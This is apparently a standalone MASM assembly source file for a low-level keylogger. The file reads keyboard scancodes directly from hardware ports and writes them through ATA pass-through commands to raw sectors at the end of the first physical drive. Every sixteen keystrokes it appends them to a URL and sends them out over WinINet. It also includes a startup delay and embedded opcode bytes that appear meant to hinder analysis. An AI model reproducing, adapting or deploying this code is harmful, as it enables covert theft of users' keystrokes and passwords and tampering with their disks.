.386
option casemap:none
.model flat,stdcall
include 	\masm\include\windows.inc
include 	\masm\include\masm32.inc
include 	\masm\include\kernel32.inc
includelib 	\masm\lib\kernel32.lib
includelib 	\masm\lib\masm32.lib
includelib 	\masm\lib\shlwapi.lib
include 	\masm\include\shlwapi.inc
include		\MASM\include\msvcrt.inc
includelib	\MASM\lib\msvcrt.lib
include		\MASM\include\wininet.inc
includelib 	\MASM\lib\wininet.lib
strcpy 		PROTO C :dword ,:dword
strcat 		PROTO C :dword ,:dword
memcpy 		PROTO C :dword ,:dword,:dword
_memicmp	PROTO C :dword ,:dword, :dword

.DATA
Text			dd  0,0
PHYSICALDRIVE1 	db  "\\.\PhysicalDrive0",0                                            

SCANCODE	db	0
TotalOfSectors	dd	0
CurrentSector	dd	0
hDevice			dd	0
NIL				dd	0
IsLBA48			dd	0
written						dd	0
High1							dd	0						
MAXBUF								dd	0						
Counter									dd	0
Counter2									dd	0
KEYSTROKES	db	512	dup	(0)

Storage  dw 0,0
sAgent   dd 0,0
hConnect dd 0,0
hUrl     dd 0,0
url db  '',0
_urlTmp 	db 2048 dup (0)
IDENTIFY_DEVICE_DATA STRUC 
 	GeneralConfiguration		dw ? 
 	NumCylinders			dw ? 
 	ReservedWord2			dw ? 
 	NumHeads			dw ? 
 	Retired1			dw 2 dup (?) 
 	NumSectorsPerTrack		dw ? 
 	VendorUnique1			dw 3 dup (?) 
 	SerialNumber			db 20 dup (?) 
 	Retired2			dw 2 dup (?) 
 	Obsolete1			dw ? 
 	FirmwareRevision		db 8 dup (?) 
 	ModelNumber			db 40 dup (?) 
 	MaximumBlockTransfer		db ? 
 	VendorUnique2			db ? 
 	ReservedWord48			dw ? 
 	Capabilities			dd ? 
 	ObsoleteWords51 		dw 2 dup (?) 
 	TranslationFieldsValid		dw ? 
 	NumberOfCurrentCylinders	dw ? 
 	NumberOfCurrentHeads		dw ? 
 	CurrentSectorsPerTrack		dw ? 
 	CurrentSectorCapacity		dd ? 
 	CurrentMultiSectorSetting	db ? 
 	MultiSectorSettingValid 	db ? 
 	UserAddressableSectors		dd ? 
 	ObsoleteWord62			dw ? 
 	MultiWordDMASupport		db ? 
 	MultiWordDMAActive		db ? 
 	AdvancedPIOModes		db ? 
 	ReservedByte64			db ? 
 	MinimumMWXferCycleTime		dw ? 
 	RecommendedMWXferCycleTime	dw ? 
 	MinimumPIOCycleTime		dw ? 
 	MinimumPIOCycleTimeIORDY	dw ? 
 	ReservedWords69 		dw 6 dup (?) 
 	QueueDepth			dw ? 
 	ReservedWords76 		dw 4 dup (?) 
 	MajorRevision			dw ? 
 	MinorRevision			dw ?	 
 	CommandSetSupport		dw 3 dup (?) 
 	CommandSetActive		dw 3 dup (?) 
 	UltraDMASupport 		db ? 
 	UltraDMAActive			db ? 
 	ReservedWord89			dw 4 dup (?) 
 	HardwareResetResult		dw ? 
 	CurrentAcousticValue		db ? 
 	RecommendedAcousticValue	db ? 
 	ReservedWord95			dw 5 dup (?) 
	Max48BitLBA			dq ? 
 	StreamingTransferTime		dw ? 
 	ReservedWord105 		dw ? 
 	PhysicalLogicalSectorSize	dw ? 
 	InterSeekDelay			dw ? 
 	WorldWideName			dw 4 dup (?) 
 	ReservedForWorldWideName128	dw 4 dup (?) 
 	ReservedForTlcTechnicalReport	dw ? 
 	WordsPerLogicalSector		dw 2 dup (?) 
 	CommandSetSupportExt		dw ? 
 	CommandSetActiveExt		dw ? 
 	ReservedForExpandedSupportandActive	dw 6 dup (?) 
	MsnSupport			dw ? 
 	SecurityStatus			dw ? 
 	ReservedWord129 		dw 31 dup (?) 
	CfaPowerModel			dw ? 
 	ReservedForCfaWord161		dw 8 dup (?) 
 	DataSetManagementFeature	dw ? 
 	ReservedForCfaWord170		dw 6 dup (?) 
 	CurrentMediaSerialNumber	dw 30 dup (?) 
 	ReservedWord206 		dw ? 
 	ReservedWord207 		dw 2 dup (?) 
 	BlockAlignment			dw ? 
 	WriteReadVerifySectorCountMode3Only	dw 2 dup (?) 
 	WriteReadVerifySectorCountMode2Only	dw 2 dup (?) 
 	NVCacheCapabilities		dw ? 
 	NVCacheSizeLSW			dw ? 
 	NVCacheSizeMSW			dw ? 
 	NominalMediaRotationRate	dw ? 
 	ReservedWord218 		dw ? 
 	NVCacheEstimatedTimeToSpinUpInSeconds	dw ? 
 	Reserved			dw ? 
 	ReservedWord220 		dw 35 dup (?) 
 	Signature			db ? 
 	CheckSum			db ? 
 IDENTIFY_DEVICE_DATA ENDS
 
 IdentificaDrive IDENTIFY_DEVICE_DATA <>

ATA_STRUCT1 STRUC DWORD
	Features	BYTE ?
	Count   	BYTE ?
	Number		BYTE ?
	Cylinder	BYTE ?
	CylinderH	BYTE ?
	Device_Head	BYTE ?
	Command		BYTE ?
	Reserved	BYTE ?
	ATA_STRUCT1 ENDS     
	ATA_STRUCT2 STRUCT DWORD
	Features	BYTE ?
	Count   	BYTE ?
	Number		BYTE ?
	Cylinder	BYTE ?
	CylinderH	BYTE ?
	Device_Head	BYTE ?
	Command		BYTE ?
	Reserved	BYTE ?
	ATA_STRUCT2 ENDS     			
	ATA_PASS_THRU STRUCT DWORD
	Length1				WORD  ?
	AtaFlags			WORD  ?
	PathId				BYTE  ? 
	TargetId			BYTE  ?
	Lun				BYTE  ?
	Reserved1			BYTE  ?
	DataTransferLength		DWORD  ?
	TimeOutValue			DWORD  ?
	Reserved2			DWORD  ?
	DATABUFFEROFFSET		DWORD  ?
	align 8
	Ata1				ATA_STRUCT1 <>
	align 8
	Ata2				ATA_STRUCT2 <>
	ATA_PASS_THRU ENDS
	PTE1 ATA_PASS_THRU <>
	
.CODE
main:
call delay2
int 28h
jmp L0
DB 48h,8Bh,44h,24h,10h,48h,0dh,0,30h,0,0,48h,89h,44h,24h,10h,48h,0cfh
L0:
CALL IDENTIFYDEVICE
MOV EBX,SIZEOF ATA_PASS_THRU		
;LEA EDI,[PTE1+EBX]
LEA EDX,[PTE1+EBX]
ADD EDX,[IDENTIFY_DEVICE_DATA.Max48BitLBA]
MOV EDI,[EDX]
MOV EAX,[EDX]
LEA EDX,[PTE1+EBX]
ADD EDX,[IDENTIFY_DEVICE_DATA.UserAddressableSectors]
MOV EBX,[EDX]
CMP EBX,EAX
JZ LBA28
MOV [IsLBA48],1
JMP LBA48
LBA28:
MOV [IsLBA48],0
LBA48:
MOV ESI,EDI
MOV TotalOfSectors,ESI
MOV EDI,TotalOfSectors
SUB EDI,3
MOV TotalOfSectors,EDI
MOV EAX,10
MOV EBX,TotalOfSectors
SUB EBX,EAX
MOV MAXBUF,EBX
MOV Counter2,0
Q1:
CMP Counter,512
JZ WriteBuf
CMP Counter2,16
JZ SendToInternet
CALL get_scancode
MOV ECX,Counter
MOV BYTE PTR[PTE1+28h+ECX],AL
INC Counter
INC Counter2
JMP Q1

WriteBuf:
CMP [IsLBA48],0
JZ L28
CALL WritePhysicalSector48
JMP L48
L28:
CALL WritePhysicalSector28
L48:

MOV EDI,TotalOfSectors
DEC EDI
MOV TotalOfSectors,EDI
MOV Counter,0
lea edi,[PTE1+28h]
mov eax,0
mov ecx,512
rep stosb

MOV EAX,MAXBUF
CMP TotalOfSectors,EAX
JZ L0
JMP Q1
SendToInternet:
CALL send_over_network
MOV Counter2,0
JMP Q1
FINAL:
RET
;##################################################################################
get_scancode proc near
A1:
IN AL,64H
AND AL,21h
CMP AL,1
JNZ A1
CALL delay
IN AL,60H
MOV [SCANCODE],AL
RET
get_scancode endp
;##################################################################################
IDENTIFYDEVICE PROC NEAR
invoke CreateFileA,offset PHYSICALDRIVE1,GENERIC_ALL,3,0,3,0,0
MOV hDevice,EAX	
MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,200h
MOV PTE1.DataTransferLength,EAX

MOV EAX,[SIZEOF ATA_PASS_THRU]
MOV PTE1.DATABUFFEROFFSET,EAX
MOV BL,0
MOV AL,0ECh
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: EFETUA O COMANDO IDENTIFY DEVICE PARA OBTER TODAS AS INFORMAÇÕES DO DRIVE

MOV AL,0
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV AX,3h
MOV PTE1.AtaFlags,AX

mov ebx,0
mov al,bl
MOV AL,0
MOV PTE1.Ata2.Number,AL
MOV PTE1.Ata2.Cylinder,AL
MOV PTE1.Ata2.CylinderH,AL
invoke DeviceIoControl,hDevice,4D02Ch,offset PTE1,228h,offset PTE1,228h,offset NIL,0


invoke CloseHandle,hDevice
RET
IDENTIFYDEVICE ENDP
;##################################################################################
WritePhysicalSector48 PROC NEAR

invoke CreateFileA,addr PHYSICALDRIVE1,GENERIC_ALL,3,0,3,0,0
MOV [hDevice],EAX

MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,512
MOV PTE1.DataTransferLength,EAX

MOV EAX,SIZEOF ATA_PASS_THRU
MOV PTE1.DATABUFFEROFFSET,EAX

MOV AL,1
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

MOV EBX,TotalOfSectors
and ebx,0FFh
mov al,bl
MOV PTE1.Ata2.Number,AL

MOV EBX,TotalOfSectors
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV PTE1.Ata2.Cylinder,AL


MOV EBX,TotalOfSectors
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV PTE1.Ata2.CylinderH,AL

MOV EBX,TotalOfSectors
;and ebx,0ff000000h
;shr ebx,24
mov bl,0
mov al,bl
OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV EBX,TotalOfSectors
and ebx,0ff000000h
shr ebx,24
mov al,bl
MOV PTE1.Ata1.Number,AL

mov al,0
MOV PTE1.Ata1.CylinderH,AL

mov al,0
MOV PTE1.Ata1.Cylinder,AL

MOV AL,034h
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,12
MOV PTE1.AtaFlags,AX


	
invoke DeviceIoControl,hDevice,4D02Ch,offset PTE1,228h,offset PTE1,228h,offset NIL,0
invoke CloseHandle,hDevice
ret

WritePhysicalSector48 ENDP
;##################################################################################
WritePhysicalSector28 PROC NEAR

invoke CreateFileA,addr PHYSICALDRIVE1,GENERIC_ALL,3,0,3,0,0
MOV [hDevice],EAX

MOV EAX,28h
MOV PTE1.Length1,AX

MOV EAX,0Ah
MOV PTE1.TimeOutValue,EAX

MOV EAX,512
MOV PTE1.DataTransferLength,EAX

MOV EAX,SIZEOF ATA_PASS_THRU
MOV PTE1.DATABUFFEROFFSET,EAX

MOV AL,1
MOV PTE1.Ata2.Count,AL
MOV BL,0
MOV AL,BL

MOV EBX,TotalOfSectors
and ebx,0FFh
mov al,bl
MOV PTE1.Ata2.Number,AL

MOV EBX,TotalOfSectors
and ebx,0ff00h
shr ebx,8
mov al,bl
MOV PTE1.Ata2.Cylinder,AL


MOV EBX,TotalOfSectors
and ebx,0ff0000h
shr ebx,16
mov al,bl
MOV PTE1.Ata2.CylinderH,AL

MOV EBX,TotalOfSectors
and ebx,0ff000000h
shr ebx,24
MOV AL,BL
OR AL,0E0h
MOV PTE1.Ata2.Device_Head,AL

MOV AL,030h
MOV PTE1.Ata2.Command,AL			;IMPORTANTE: COMANDO ATA 30H: ESCREVE SETOR(ES)

MOV AX,4
MOV PTE1.AtaFlags,AX

	
invoke DeviceIoControl,hDevice,4D02Ch,offset PTE1,228h,offset PTE1,228h,offset NIL,0
invoke CloseHandle,hDevice
ret

WritePhysicalSector28 ENDP
;##################################################################################
delay proc
mov ecx,6000h
Q01:
cmp ecx,0
jz Q02
dec ecx
jmp Q01
Q02:
ret
delay endp

delay2 proc
mov ecx,50000000h
Q03:
cmp ecx,0
jz Q04
dec ecx
jmp Q03
Q04:
ret
delay2 endp

send_over_network proc near
Lab1:
invoke strcpy,addr _urlTmp ,addr url
lea edi,[_urlTmp]
lea esi,[url]
mov ecx,sizeof url
add ecx,2
rep movsb
invoke strcat, addr _urlTmp ,addr [PTE1+28H]
invoke InternetOpen,addr sAgent, 0, 0, 0, 0h
mov hConnect, eax
invoke InternetOpenUrl, hConnect,addr _urlTmp, 0,0,0,0
mov hUrl,eax
invoke InternetCloseHandle,hConnect
invoke InternetCloseHandle,hUrl
ret
send_over_network endp
END main